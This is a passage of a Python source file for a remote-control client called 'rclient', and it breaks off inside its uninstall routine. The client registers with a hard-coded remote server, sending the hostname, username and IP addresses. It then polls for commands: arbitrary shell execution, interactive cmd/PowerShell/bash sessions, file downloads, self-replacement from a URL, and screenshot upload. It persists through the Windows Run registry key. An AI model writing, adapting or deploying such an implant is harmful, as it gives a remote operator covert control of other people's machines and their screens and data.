import logging
import os
import platform
import socket
import shutil
import subprocess
import sys
import tempfile
import time
import uuid
import base64
import json
import queue
import threading
import ctypes
import getpass
from pathlib import Path
from urllib.parse import urlparse

import requests

try:
    import tkinter as tk
except Exception:  # pragma: no cover - optional UI support
    tk = None

TOKEN = "a9K2xP8mZ7QwL1vB"
SERVER_URL = "https://client-status-server.onrender.com"
POLL_INTERVAL_SECONDS = 5
REQUEST_TIMEOUT_SECONDS = 30
COMMAND_TIMEOUT_SECONDS = 120
APP_NAME = "rclient"
TASK_NAME = "rclient"
RUN_REGISTRY_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
APP_VERSION = "1.0.5"
GITHUB_OWNER = "hezztecan-spec"
GITHUB_REPO = "licilicl"
AUTO_UPDATE_ENABLED = True
AUTO_UPDATE_CHECK_INTERVAL_SECONDS = 600
IS_FROZEN = getattr(sys, "frozen", False)
BASE_DIR = Path(sys.executable).resolve().parent if IS_FROZEN else Path(__file__).resolve().parent
STATE_DIR = BASE_DIR / "state"
DOWNLOADS_DIR = BASE_DIR / "downloads"
CLIENT_ID_PATH = STATE_DIR / "client_id.txt"
LOG_PATH = STATE_DIR / "client.log"
TERMINAL_SESSIONS = {}
WINDOWS_TRAY_ICON = None


class WinPoint(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


class WinMsg(ctypes.Structure):
    _fields_ = [
        ("hwnd", ctypes.c_void_p),
        ("message", ctypes.c_uint),
        ("wParam", ctypes.c_void_p),
        ("lParam", ctypes.c_void_p),
        ("time", ctypes.c_ulong),
        ("pt", WinPoint),
        ("lPrivate", ctypes.c_ulong),
    ]


class WinWndClass(ctypes.Structure):
    _fields_ = [
        ("style", ctypes.c_uint),
        ("lpfnWndProc", ctypes.c_void_p),
        ("cbClsExtra", ctypes.c_int),
        ("cbWndExtra", ctypes.c_int),
        ("hInstance", ctypes.c_void_p),
        ("hIcon", ctypes.c_void_p),
        ("hCursor", ctypes.c_void_p),
        ("hbrBackground", ctypes.c_void_p),
        ("lpszMenuName", ctypes.c_wchar_p),
        ("lpszClassName", ctypes.c_wchar_p),
    ]


class WinNotifyIconData(ctypes.Structure):
    _fields_ = [
        ("cbSize", ctypes.c_uint),
        ("hWnd", ctypes.c_void_p),
        ("uID", ctypes.c_uint),
        ("uFlags", ctypes.c_uint),
        ("uCallbackMessage", ctypes.c_uint),
        ("hIcon", ctypes.c_void_p),
        ("szTip", ctypes.c_wchar * 128),
        ("dwState", ctypes.c_uint),
        ("dwStateMask", ctypes.c_uint),
        ("szInfo", ctypes.c_wchar * 256),
        ("uVersion", ctypes.c_uint),
        ("szInfoTitle", ctypes.c_wchar * 64),
        ("dwInfoFlags", ctypes.c_uint),
        ("guidItem", ctypes.c_ubyte * 16),
        ("hBalloonIcon", ctypes.c_void_p),
    ]


def ensure_directories():
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)


def set_windows_app_id():
    if not is_windows():
        return

    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(APP_NAME)
    except Exception:
        logging.exception("Failed to set Windows AppUserModelID")


def show_startup_splash():
    if not is_windows() or tk is None:
        return

    try:
        splash = tk.Tk()
        splash.title(APP_NAME)
        splash.overrideredirect(False)
        splash.resizable(False, False)
        splash.attributes("-topmost", True)
        splash.configure(bg="#1f1915")

        window_width = 380
        window_height = 150
        screen_width = splash.winfo_screenwidth()
        screen_height = splash.winfo_screenheight()
        position_x = int((screen_width - window_width) / 2)
        position_y = int((screen_height - window_height) / 2)
        splash.geometry(f"{window_width}x{window_height}+{position_x}+{position_y}")

        frame = tk.Frame(splash, bg="#1f1915", padx=24, pady=24)
        frame.pack(fill="both", expand=True)

        title_label = tk.Label(
            frame,
            text="rclient",
            font=("Segoe UI", 18, "bold"),
            fg="#fff8f3",
            bg="#1f1915",
        )
        title_label.pack(pady=(8, 10))

        subtitle_label = tk.Label(
            frame,
            text="Спасибо, что выбрали нас",
            font=("Segoe UI", 11),
            fg="#d8c9ba",
            bg="#1f1915",
        )
        subtitle_label.pack()

        splash.after(2000, splash.destroy)
        splash.mainloop()
    except Exception:
        logging.exception("Failed to show startup splash")


def configure_logging():
    ensure_directories()
    handlers = [logging.FileHandler(LOG_PATH, encoding="utf-8")]
    if not IS_FROZEN:
        handlers.append(logging.StreamHandler(sys.stdout))

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=handlers,
    )


def load_or_create_client_id():
    ensure_directories()
    if CLIENT_ID_PATH.exists():
        client_id = CLIENT_ID_PATH.read_text(encoding="utf-8").strip()
        if client_id:
            return client_id

    client_id = str(uuid.uuid4())
    CLIENT_ID_PATH.write_text(client_id, encoding="utf-8")
    logging.info("Generated new client_id: %s", client_id)
    return client_id


def send_post(endpoint, payload):
    url = f"{SERVER_URL}{endpoint}"
    response = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT_SECONDS, headers=build_http_headers())
    response.raise_for_status()
    return response.json()


def send_get(endpoint, params):
    url = f"{SERVER_URL}{endpoint}"
    response = requests.get(url, params=params, timeout=REQUEST_TIMEOUT_SECONDS, headers=build_http_headers())
    response.raise_for_status()
    return response.json()


def get_local_ip_addresses():
    addresses = []

    try:
        host_info = socket.gethostbyname_ex(socket.gethostname())
        for address in host_info[2]:
            if address and address not in addresses:
                addresses.append(address)
    except OSError:
        pass

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            address = sock.getsockname()[0]
            if address and address not in addresses:
                addresses.append(address)
    except OSError:
        pass

    return addresses


def format_bytes(value):
    units = ["B", "KB", "MB", "GB", "TB"]
    size = float(max(value, 0))
    unit_index = 0

    while size >= 1024 and unit_index < len(units) - 1:
        size /= 1024
        unit_index += 1

    return f"{size:.2f} {units[unit_index]}"


def get_cpu_name():
    processor_name = (platform.processor() or "").strip()
    if processor_name:
        return processor_name

    try:
        if is_windows():
            completed = subprocess.run(
                ["wmic", "cpu", "get", "Name", "/value"],
                capture_output=True,
                text=True,
                timeout=10,
                check=False,
            )
            for line in completed.stdout.splitlines():
                if line.startswith("Name="):
                    value = line.split("=", 1)[1].strip()
                    if value:
                        return value
        elif sys.platform == "darwin":
            completed = subprocess.run(
                ["sysctl", "-n", "machdep.cpu.brand_string"],
                capture_output=True,
                text=True,
                timeout=10,
                check=False,
            )
            value = completed.stdout.strip()
            if value:
                return value
        elif Path("/proc/cpuinfo").exists():
            for line in Path("/proc/cpuinfo").read_text(encoding="utf-8", errors="ignore").splitlines():
                if ":" in line and line.lower().startswith("model name"):
                    value = line.split(":", 1)[1].strip()
                    if value:
                        return value
    except Exception:
        logging.exception("Failed to detect CPU name")

    return "unknown"


def get_memory_snapshot():
    try:
        if is_windows():
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            memory_status = MEMORYSTATUSEX()
            memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
            total = int(memory_status.ullTotalPhys)
            available = int(memory_status.ullAvailPhys)
        else:
            page_size = os.sysconf("SC_PAGE_SIZE")
            total = int(os.sysconf("SC_PHYS_PAGES") * page_size)
            available = int(os.sysconf("SC_AVPHYS_PAGES") * page_size)
    except Exception:
        logging.exception("Failed to read memory snapshot")
        return None

    used = max(total - available, 0)
    percent = (used / total * 100) if total else 0
    return {
        "total": total,
        "available": available,
        "used": used,
        "percent": percent,
    }


def get_disk_snapshot():
    try:
        root_path = Path.home().anchor or "/"
        usage = shutil.disk_usage(root_path)
    except Exception:
        logging.exception("Failed to read disk snapshot")
        return None

    percent = (usage.used / usage.total * 100) if usage.total else 0
    return {
        "total": int(usage.total),
        "used": int(usage.used),
        "free": int(usage.free),
        "percent": percent,
    }


def get_system_info():
    memory = get_memory_snapshot()
    disk = get_disk_snapshot()

    return {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.platform(),
        "platform": platform.system(),
        "platform_release": platform.release(),
        "architecture": platform.machine() or "unknown",
        "cpu_name": get_cpu_name(),
        "cpu_logical_cores": str(os.cpu_count() or 0),
        "ram_total": format_bytes(memory["total"]) if memory else "unknown",
        "ram_available": format_bytes(memory["available"]) if memory else "unknown",
        "ram_used": format_bytes(memory["used"]) if memory else "unknown",
        "ram_usage_percent": f"{memory['percent']:.1f}%" if memory else "unknown",
        "disk_total": format_bytes(disk["total"]) if disk else "unknown",
        "disk_used": format_bytes(disk["used"]) if disk else "unknown",
        "disk_free": format_bytes(disk["free"]) if disk else "unknown",
        "disk_usage_percent": f"{disk['percent']:.1f}%" if disk else "unknown",
        "python_version": platform.python_version(),
        "client_version": APP_VERSION,
        "local_ips": ", ".join(get_local_ip_addresses()) or "unknown",
        "frozen": "true" if IS_FROZEN else "false",
    }


def register_client(client_id):
    logging.info("Registering client %s", client_id)
    send_post(
        "/register",
        {
            "client_id": client_id,
            "token": TOKEN,
            "system_info": get_system_info(),
        },
    )


def get_command(client_id):
    return send_get("/get-command", {"client_id": client_id, "token": TOKEN})


def report_result(client_id, result, command_payload=None):
    screenshot_data_url = ""
    result_text = result

    if isinstance(result, dict):
        result_text = str(result.get("result", "")).strip()
        screenshot_data_url = str(result.get("screenshot_data_url", "")).strip()

    safe_result = result_text if len(result_text) <= 20000 else f"{result_text[:20000]}\n\n[truncated]"
    logging.info("Reporting result for client %s", client_id)
    payload = {"client_id": client_id, "token": TOKEN, "result": safe_result}

    if isinstance(command_payload, dict):
        for key in [
            "command_id",
            "command_kind",
            "terminal_session_id",
            "terminal_type",
            "terminal_title",
            "display_command",
        ]:
            value = command_payload.get(key)
            if isinstance(value, str) and value.strip():
                payload[key] = value.strip()

    if screenshot_data_url:
        payload["screenshot_data_url"] = screenshot_data_url

    send_post("/report", payload)


def execute_shell(command_text):
    shell_command = command_text[len("shell:") :].strip()
    if not shell_command:
        raise ValueError("shell command is empty")

    logging.info("Executing shell command: %s", shell_command)
    completed = subprocess.run(
        shell_command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=COMMAND_TIMEOUT_SECONDS,
    )

    stdout = completed.stdout.strip()
    stderr = completed.stderr.strip()
    parts = [f"exit_code={completed.returncode}"]
    if stdout:
        parts.append(f"stdout:\n{stdout}")
    if stderr:
        parts.append(f"stderr:\n{stderr}")
    return "\n\n".join(parts)


class TerminalSession:
    def __init__(self, session_id, terminal_type):
        self.session_id = session_id
        self.terminal_type = terminal_type
        self.process = self._start_process(terminal_type)
        self.output_queue = queue.Queue()
        self.write_lock = threading.Lock()
        self.reader_thread = threading.Thread(target=self._read_output, daemon=True)
        self.reader_thread.start()

    def _start_process(self, terminal_type):
        if terminal_type == "cmd":
            command = ["cmd.exe", "/Q", "/K"] if is_windows() else ["sh"]
        elif terminal_type == "powershell":
            if is_windows():
                command = ["powershell.exe", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "-"]
            else:
                command = ["pwsh", "-NoLogo", "-NoProfile", "-Command", "-"]
        elif terminal_type == "bash":
            command = ["bash"]
        elif terminal_type == "sh":
            command = ["sh"]
        else:
            raise ValueError(f"unsupported terminal type: {terminal_type}")

        logging.info("Starting terminal session %s (%s)", self.session_id, terminal_type)
        return subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            cwd=str(BASE_DIR),
            errors="replace",
        )

    def _read_output(self):
        try:
            while True:
                line = self.process.stdout.readline()
                if line == "":
                    break
                self.output_queue.put(line)
        except Exception:
            logging.exception("Terminal reader failed for %s", self.session_id)

    def _send_text(self, text):
        if self.process.poll() is not None:
            raise RuntimeError("terminal session is closed")
        if not self.process.stdin:
            raise RuntimeError("terminal stdin is unavailable")
        self.process.stdin.write(text)
        self.process.stdin.flush()

    def execute(self, command_text):
        marker = uuid.uuid4().hex
        end_marker = f"__CODEX_END__{marker}"
        start_marker = f"__CODEX_START__{marker}"

        with self.write_lock:
            while True:
                try:
                    self.output_queue.get_nowait()
                except queue.Empty:
                    break

            self._send_text(build_terminal_script(self.terminal_type, command_text, marker))
            started = False
            collected = []
            exit_code = "unknown"
            deadline = time.time() + COMMAND_TIMEOUT_SECONDS

            while time.time() < deadline:
                timeout = max(deadline - time.time(), 0.1)
                try:
                    chunk = self.output_queue.get(timeout=timeout)
                except queue.Empty:
                    continue

                line = chunk.rstrip("\r\n")
                if not started:
                    if line == start_marker:
                        started = True
                    continue

                if line.startswith(end_marker):
                    _, _, exit_code = line.partition(":")
                    break

                collected.append(chunk)
            else:
                raise TimeoutError("interactive terminal command timed out")

        output_text = "".join(collected).strip()
        parts = [f"exit_code={exit_code}"]
        if output_text:
            parts.append(f"stdout:\n{output_text}")
        return "\n\n".join(parts)

    def close(self):
        logging.info("Closing terminal session %s", self.session_id)
        try:
            if self.process.stdin:
                self.process.stdin.close()
        except Exception:
            pass

        if self.process.poll() is None:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except Exception:
                try:
                    self.process.kill()
                except Exception:
                    pass


def build_terminal_script(terminal_type, command_text, marker):
    start_marker = f"__CODEX_START__{marker}"
    end_marker = f"__CODEX_END__{marker}"

    if terminal_type == "cmd":
        return (
            f"echo {start_marker}\n"
            f"{command_text}\n"
            f"echo {end_marker}:%errorlevel%\n"
        )

    if terminal_type == "powershell":
        return (
            f'Write-Output "{start_marker}"\n'
            "$global:LASTEXITCODE = 0\n"
            f"{command_text}\n"
            'if ($null -eq $LASTEXITCODE) { $LASTEXITCODE = 0 }\n'
            f'Write-Output "{end_marker}:$LASTEXITCODE"\n'
        )

    return (
        f"printf '%s\\n' '{start_marker}'\n"
        "{\n"
        f"{command_text}\n"
        "}\n"
        f"printf '%s:%s\\n' '{end_marker}' \"$?\"\n"
    )


def decode_terminal_payload(command_text, prefix):
    payload = command_text[len(prefix) :].strip()
    if not payload:
        raise ValueError("terminal payload is empty")

    decoded = base64.b64decode(payload.encode("ascii"))
    parsed = json.loads(decoded.decode("utf-8"))
    if not isinstance(parsed, dict):
        raise ValueError("terminal payload must be an object")
    return parsed


def normalize_terminal_type(value):
    terminal_type = str(value or "").strip().lower()
    if terminal_type in {"cmd", "powershell", "bash", "sh"}:
        return terminal_type
    return "cmd" if is_windows() else "bash"


def get_or_create_terminal_session(session_id, terminal_type):
    session = TERMINAL_SESSIONS.get(session_id)
    normalized_type = normalize_terminal_type(terminal_type)

    if session and session.process.poll() is None and session.terminal_type == normalized_type:
        return session

    if session:
        session.close()

    new_session = TerminalSession(session_id, normalized_type)
    TERMINAL_SESSIONS[session_id] = new_session
    return new_session


def execute_terminal(command_text):
    payload = decode_terminal_payload(command_text, "terminal_exec:")
    session_id = str(payload.get("session_id", "")).strip()
    terminal_type = normalize_terminal_type(payload.get("terminal_type"))
    command = str(payload.get("command", "")).strip()

    if not session_id:
        raise ValueError("terminal session_id is required")
    if not command:
        raise ValueError("terminal command is empty")

    session = get_or_create_terminal_session(session_id, terminal_type)
    return session.execute(command)


def close_terminal(command_text):
    payload = decode_terminal_payload(command_text, "terminal_close:")
    session_id = str(payload.get("session_id", "")).strip()
    if not session_id:
        raise ValueError("terminal session_id is required")

    session = TERMINAL_SESSIONS.pop(session_id, None)
    if session:
        session.close()

    return f"terminal_session_closed={session_id}"


def derive_filename_from_url(url):
    parsed = urlparse(url)
    name = Path(parsed.path).name
    return name or "downloaded_file"


def download_to_path(url, destination):
    with requests.get(
        url,
        stream=True,
        timeout=REQUEST_TIMEOUT_SECONDS,
        headers=build_http_headers(),
    ) as response:
        response.raise_for_status()
        with destination.open("wb") as target:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    target.write(chunk)


def execute_download(command_text):
    payload = command_text[len("download:") :].strip()
    if not payload:
        raise ValueError("download command is empty")

    parts = payload.split(maxsplit=1)
    url = parts[0]
    filename = parts[1].strip() if len(parts) == 2 else derive_filename_from_url(url)
    destination = DOWNLOADS_DIR / filename

    logging.info("Downloading file from %s to %s", url, destination)
    download_to_path(url, destination)
    size = destination.stat().st_size
    return f"downloaded={destination} size={size}"


def execute_update(command_text):
    update_url = command_text[len("update:") :].strip()
    if not update_url:
        raise ValueError("update command is empty")

    return apply_update_from_url(update_url, source="manual")


def create_screenshot_data_url(file_path, mime_type):
    raw_bytes = Path(file_path).read_bytes()
    encoded = base64.b64encode(raw_bytes).decode("ascii")
    return f"data:{mime_type};base64,{encoded}"


def execute_screenshot(_command_text):
    temp_dir = Path(tempfile.mkdtemp(prefix="rclient-shot-"))

    try:
        if is_windows():
            output_path = temp_dir / "screenshot.jpg"
            escaped_output_path = str(output_path).replace("'", "''")
            powershell_script = (
                "Add-Type -AssemblyName System.Windows.Forms; "
                "Add-Type -AssemblyName System.Drawing; "
                "$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen; "
                "$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; "
                "$graphics = [System.Drawing.Graphics]::FromImage($bmp); "
                "$graphics.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bmp.Size); "
                f"$bmp.Save('{escaped_output_path}', [System.Drawing.Imaging.ImageFormat]::Jpeg); "
                "$graphics.Dispose(); "
                "$bmp.Dispose()"
            )
            completed = subprocess.run(
                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_script],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
                creationflags=subprocess.CREATE_NO_WINDOW if is_windows() else 0,
            )
            if completed.returncode != 0 or not output_path.exists():
                raise RuntimeError(get_process_error_message(completed, "failed to capture screenshot"))

            screenshot_data_url = create_screenshot_data_url(output_path, "image/jpeg")
        elif sys.platform == "darwin":
            output_path = temp_dir / "screenshot.png"
            completed = subprocess.run(
                ["screencapture", "-x", str(output_path)],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            if completed.returncode != 0 or not output_path.exists():
                raise RuntimeError(get_process_error_message(completed, "failed to capture screenshot"))

            screenshot_data_url = create_screenshot_data_url(output_path, "image/png")
        else:
            output_path = temp_dir / "screenshot.png"
            capture_commands = [
                ["gnome-screenshot", "-f", str(output_path)],
                ["scrot", str(output_path)],
            ]
            screenshot_data_url = ""

            for command in capture_commands:
                completed = subprocess.run(
                    command,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    check=False,
                )
                if completed.returncode == 0 and output_path.exists():
                    screenshot_data_url = create_screenshot_data_url(output_path, "image/png")
                    break

            if not screenshot_data_url:
                raise RuntimeError("failed to capture screenshot: no supported screenshot utility found")

        image_size = len(screenshot_data_url)
        return {
            "result": f"screenshot_captured bytes={image_size}",
            "screenshot_data_url": screenshot_data_url,
        }
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


def restart_current_client():
    script_path = Path(sys.executable).resolve() if IS_FROZEN else Path(__file__).resolve()

    if IS_FROZEN and is_windows():
        start_detached_windows_process([str(script_path)])
        raise RestartRequested("client_restarted source=manual restarting=true")

    restart_python_client(script_path)
    raise RestartRequested("client_restarted source=manual restarting=true")


def execute_command(command_text):
    if not isinstance(command_text, str):
        raise ValueError("command must be a string")

    normalized = command_text.strip()
    if not normalized:
        raise ValueError("command is empty")

    if normalized == "restart":
        return restart_current_client()
    if normalized.startswith("shell:"):
        return execute_shell(normalized)
    if normalized.startswith("download:"):
        return execute_download(normalized)
    if normalized.startswith("update:"):
        return execute_update(normalized)
    if normalized == "screenshot":
        return execute_screenshot(normalized)
    if normalized.startswith("terminal_exec:"):
        return execute_terminal(normalized)
    if normalized.startswith("terminal_close:"):
        return close_terminal(normalized)

    raise ValueError(
        "unsupported command format. Use restart, shell:<cmd>, download:<url> [filename], update:<url>, screenshot, terminal_exec:<payload>, or terminal_close:<payload>"
    )


def is_windows():
    return os.name == "nt"


class WindowsTrayIcon:
    WM_DESTROY = 0x0002
    WM_CLOSE = 0x0010
    WM_APP = 0x8000
    NIM_ADD = 0x00000000
    NIM_MODIFY = 0x00000001
    NIM_DELETE = 0x00000002
    NIF_MESSAGE = 0x00000001
    NIF_ICON = 0x00000002
    NIF_TIP = 0x00000004
    IDI_APPLICATION = 32512
    CS_HREDRAW = 0x0002
    CS_VREDRAW = 0x0001
    IMAGE_ICON = 1
    LR_LOADFROMFILE = 0x00000010
    LR_DEFAULTSIZE = 0x00000040

    def __init__(self, tooltip):
        self.tooltip = tooltip[:127]
        self.window_class_name = f"{APP_NAME}_tray_class"
        self.window_title = APP_NAME
        self.hwnd = None
        self.hicon = None
        self.class_atom = None
        self.thread = None
        self.thread_id = None
        self._started = threading.Event()
        self._stop_requested = False
        self._wnd_proc = ctypes.WINFUNCTYPE(
            ctypes.c_long, ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p
        )(self._window_proc)

    def start(self):
        if not is_windows():
            return

        self.thread = threading.Thread(target=self._run_message_loop, daemon=True)
        self.thread.start()
        self._started.wait(timeout=5)

    def stop(self):
        if not is_windows() or not self.thread_id:
            return

        self._stop_requested = True
        user32 = ctypes.windll.user32
        user32.PostThreadMessageW(self.thread_id, self.WM_CLOSE, 0, 0)
        if self.thread:
            self.thread.join(timeout=5)

    def _run_message_loop(self):
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        shell32 = ctypes.windll.shell32

        self.thread_id = kernel32.GetCurrentThreadId()
        hinstance = kernel32.GetModuleHandleW(None)

        wnd_class = WinWndClass()
        wnd_class.style = self.CS_HREDRAW | self.CS_VREDRAW
        wnd_class.lpfnWndProc = ctypes.cast(self._wnd_proc, ctypes.c_void_p).value
        wnd_class.hInstance = hinstance
        wnd_class.hIcon = self._load_icon()
        wnd_class.lpszClassName = self.window_class_name

        self.class_atom = user32.RegisterClassW(ctypes.byref(wnd_class))
        self.hwnd = user32.CreateWindowExW(
            0,
            self.window_class_name,
            self.window_title,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            hinstance,
            None,
        )

        if not self.hwnd:
            logging.error("Failed to create tray icon window")
            self._started.set()
            return

        notify_data = WinNotifyIconData()
        notify_data.cbSize = ctypes.sizeof(WinNotifyIconData)
        notify_data.hWnd = self.hwnd
        notify_data.uID = 1
        notify_data.uFlags = self.NIF_ICON | self.NIF_MESSAGE | self.NIF_TIP
        notify_data.uCallbackMessage = self.WM_APP + 1
        notify_data.hIcon = self._load_icon()
        notify_data.szTip = self.tooltip

        shell32.Shell_NotifyIconW(self.NIM_ADD, ctypes.byref(notify_data))
        self._started.set()

        msg = WinMsg()
        while user32.GetMessageW(ctypes.byref(msg), 0, 0, 0) != 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))

        shell32.Shell_NotifyIconW(self.NIM_DELETE, ctypes.byref(notify_data))
        if self.hwnd:
            user32.DestroyWindow(self.hwnd)
            self.hwnd = None

    def _load_icon(self):
        user32 = ctypes.windll.user32

        if IS_FROZEN:
            executable_path = str(Path(sys.executable).resolve())
            icon_handle = user32.LoadImageW(
                None,
                executable_path,
                self.IMAGE_ICON,
                0,
                0,
                self.LR_LOADFROMFILE | self.LR_DEFAULTSIZE,
            )
            if icon_handle:
                self.hicon = icon_handle
                return icon_handle

        return user32.LoadIconW(None, ctypes.c_void_p(self.IDI_APPLICATION))

    def _window_proc(self, hwnd, msg, w_param, l_param):
        user32 = ctypes.windll.user32

        if msg in {self.WM_CLOSE, self.WM_DESTROY}:
            user32.PostQuitMessage(0)
            return 0

        return user32.DefWindowProcW(hwnd, msg, w_param, l_param)


def start_windows_tray_icon():
    global WINDOWS_TRAY_ICON

    if not is_windows():
        return

    try:
        WINDOWS_TRAY_ICON = WindowsTrayIcon("rclient работает в фоне")
        WINDOWS_TRAY_ICON.start()
    except Exception:
        logging.exception("Failed to start Windows tray icon")


def stop_windows_tray_icon():
    global WINDOWS_TRAY_ICON

    if WINDOWS_TRAY_ICON is None:
        return

    try:
        WINDOWS_TRAY_ICON.stop()
    except Exception:
        logging.exception("Failed to stop Windows tray icon")
    finally:
        WINDOWS_TRAY_ICON = None


def build_http_headers():
    return {
        "User-Agent": f"{APP_NAME}/{APP_VERSION}"
    }


def get_install_dir():
    appdata = os.environ.get("APPDATA")
    if not appdata:
        raise RuntimeError("APPDATA is not defined")
    return Path(appdata) / APP_NAME


def get_installed_executable_path():
    install_dir = get_install_dir()
    executable_name = f"{APP_NAME}.exe"
    return install_dir / executable_name


def is_running_from_installed_location():
    if not IS_FROZEN or not is_windows():
        return True

    current_path = Path(sys.executable).resolve()
    target_path = get_installed_executable_path().resolve()
    return current_path == target_path


def parse_version(version_text):
    clean = version_text.strip().lower().lstrip("v")
    parts = []
    for item in clean.split("."):
        try:
            parts.append(int(item))
        except ValueError:
            parts.append(0)
    return tuple(parts)


def is_newer_version(candidate_version, current_version):
    return parse_version(candidate_version) > parse_version(current_version)


def get_expected_release_asset_name():
    return f"{APP_NAME}.exe" if IS_FROZEN else "client.py"


def get_latest_release_api_url():
    return f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/releases/latest"


def get_latest_release_info():
    response = requests.get(
        get_latest_release_api_url(),
        timeout=REQUEST_TIMEOUT_SECONDS,
        headers=build_http_headers(),
    )
    response.raise_for_status()
    payload = response.json()
    latest_version = str(payload.get("tag_name", "")).strip()
    assets = payload.get("assets", [])
    asset_name = get_expected_release_asset_name()

    asset = next((item for item in assets if item.get("name") == asset_name), None)
    if not latest_version or not asset:
        return None

    return {
        "version": latest_version,
        "download_url": asset.get("browser_download_url", "").strip()
    }


class RestartRequested(Exception):
    def __init__(self, message):
        super().__init__(message)
        self.message = message


def restart_python_client(script_path):
    subprocess.Popen(
        [sys.executable, str(script_path)],
        cwd=str(BASE_DIR),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def start_detached_windows_process(command):
    creationflags = getattr(subprocess, "DETACHED_PROCESS", 0) | getattr(
        subprocess, "CREATE_NEW_PROCESS_GROUP", 0
    )
    subprocess.Popen(
        command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=creationflags,
    )


def get_process_error_message(process_result, fallback_message):
    stderr_text = (process_result.stderr or "").strip()
    stdout_text = (process_result.stdout or "").strip()

    if stderr_text:
        return stderr_text
    if stdout_text:
        return stdout_text
    return fallback_message


def run_windows_command(command, fallback_message):
    completed = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False,
    )
    if completed.returncode != 0:
        raise RuntimeError(get_process_error_message(completed, fallback_message))
    return completed


def schedule_windows_binary_swap_and_restart(current_path, temp_path, backup_path):
    updater_path = current_path.with_name("update_client.cmd")
    pid = os.getpid()
    script_body = "\n".join(
        [
            "@echo off",
            "setlocal",
            ":waitloop",
            f'tasklist /FI "PID eq {pid}" | find "{pid}" >nul',
            "if %errorlevel%==0 (",
            "  timeout /t 1 /nobreak >nul",
            "  goto waitloop",
            ")",
            f'copy /Y "{current_path}" "{backup_path}" >nul',
            f'move /Y "{temp_path}" "{current_path}" >nul',
            f'start "" "{current_path}"',
            'del "%~f0"',
        ]
    )
    updater_path.write_text(script_body, encoding="utf-8")
    start_detached_windows_process(["cmd", "/c", str(updater_path)])


def apply_update_from_url(update_url, source, version_label="unknown"):
    script_path = Path(sys.executable).resolve() if IS_FROZEN else Path(__file__).resolve()
    replacement_suffix = ".exe.new" if IS_FROZEN else ".py.new"
    backup_suffix = ".exe.bak" if IS_FROZEN else ".py.bak"
    temp_path = script_path.with_suffix(replacement_suffix)
    backup_path = script_path.with_suffix(backup_suffix)

    logging.info("Updating client from %s", update_url)
    download_to_path(update_url, temp_path)

    if not temp_path.exists() or temp_path.stat().st_size == 0:
        temp_path.unlink(missing_ok=True)
        raise ValueError("downloaded update is empty")

    if IS_FROZEN and is_windows():
        schedule_windows_binary_swap_and_restart(script_path, temp_path, backup_path)
        raise RestartRequested(
            f"client_updated source={source} version={version_label} restarting=true"
        )

    shutil.copy2(script_path, backup_path)
    os.replace(temp_path, script_path)
    restart_python_client(script_path)
    raise RestartRequested(
        f"client_updated source={source} version={version_label} restarting=true"
    )


def install_windows_autostart():
    if not is_windows():
        raise RuntimeError("Windows autostart is supported only on Windows")
    if not IS_FROZEN:
        raise RuntimeError("Build the client as .exe before using --install")

    source_executable = Path(sys.executable).resolve()
    install_dir = get_install_dir()
    install_dir.mkdir(parents=True, exist_ok=True)
    target_executable = get_installed_executable_path()

    shutil.copy2(source_executable, target_executable)

    run_windows_command(
        [
            "reg",
            "add",
            RUN_REGISTRY_KEY,
            "/v",
            TASK_NAME,
            "/t",
            "REG_SZ",
            "/d",
            f'"{target_executable}"',
            "/f",
        ],
        "Failed to register Windows autostart",
    )

    start_detached_windows_process([str(target_executable)])

    return f"installed_to={target_executable} autostart_registry={TASK_NAME} started=true"


def uninstall_windows_autostart():
    if not is_windows():
        raise RuntimeError("Windows autostart is supported only on Windows")

    subprocess.run(
        ["reg", "delete", RUN_REGISTRY_KEY, "/v", TASK_NAME, "/f"],
        capture_output=True,
        text=True,
        check=False,
    )

    install_dir = get_install_dir()
    target_executable = get_installed_executable_path()
    if target_executable.exists():
        try:
